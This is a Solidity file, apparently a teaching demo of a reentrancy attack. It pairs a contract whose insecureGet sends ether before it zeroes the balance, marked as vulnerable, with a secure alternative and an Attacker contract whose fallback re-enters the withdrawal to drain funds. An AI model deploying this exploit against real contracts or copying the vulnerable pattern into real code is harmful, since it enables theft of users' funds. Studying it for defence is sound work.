pragma solidity ^0.4.6;

contract AttackeeContract {
  /**
  * Storage
  */
  mapping (address => uint) public balances;

  /**
  * Events
  */
  event LogPut(address from, uint amount, uint currentBalance);
  event LogGet(address from, uint amount, uint currentBalance);
  event LogGetComplete(address from, uint amount, uint currentBalance);

  /**
  * External
  */
  /// @dev put funds into contract
  function put() external payable {
    balances[msg.sender] = msg.value;
    LogPut(msg.sender, msg.value, this.balance);
  }

  /// @dev Allow users to withdraw funds
  /// VULNERABLE METHOD - To be attacked!
  function insecureGet() external {
    LogGet(msg.sender, balances[msg.sender], this.balance);

    if (!msg.sender.call.value(balances[msg.sender])()) {
      throw;
    }

    LogGetComplete(msg.sender, balances[msg.sender], this.balance);

    // Balance is zerod only after the funds have been set
    balances[msg.sender] = 0;
  }

  /// @dev Allow users to withdraw funds securely
  /// Not vulnerable to reentrancy attack
  function secureGet() external {
    // Hold value of balance but zero it in storage
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;

    LogGet(msg.sender, amount, this.balance);

    // Ether sent with only stipend of 2,300 gas
		// currently only enough to log an event
    if (!msg.sender.send(amount)) {
      throw;
    }

		// At this point, the sender's contract has a balance of 0
		// Also message sent without enough gas to reenter

    LogGetComplete(msg.sender, balances[msg.sender], this.balance);
  }
}


contract Attacker {
  /**
  * Storage
  */
  AttackeeContract public attackee;

  /**
  * Events
  */
  event LogAttackComplete(uint balance);

  /// @dev Contract constructor
  /// @param _attackee The address of the contract to attack
  function Attacker (address _attackee) {
    attackee = AttackeeContract(_attackee);
  }

  /// @dev Contract fallback
  /// ATTACK OCCURS HERE
  function () payable {
    if (attackee.balance >= msg.value) {
      attackee.insecureGet();
      /*attackee.secureGet();*/
    }

    LogAttackComplete(this.balance);
  }

  /**
  * External
  */
  /// @dev Initiate the attack
  function collect() external payable {
    attackee.put.value(msg.value)();
    attackee.insecureGet();
    /*attackee.secureGet();*/
  }

  /// @dev Allocate funds to a user owned address
  function kill() external {
    suicide(msg.sender);
  }
}
